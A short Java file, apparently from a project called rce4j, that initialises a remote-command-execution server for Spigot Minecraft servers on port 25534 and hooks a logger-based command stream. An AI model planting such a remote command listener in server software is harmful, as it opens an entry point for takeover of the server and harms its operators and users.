package org.rce4j;

import org.rce4j.command.stream.SpigotJLoggerCommandStream;

public class SpigotRceInitialiser {
    public static void initialise() {
        StaticPersistingContainer.initialise();
        StaticPersistingContainer.addPluginUpdateListener(new SpigotJLoggerCommandStream());
        
        SpigotRceServer server = new SpigotRceServer(25534);
        server.open();
    }
}
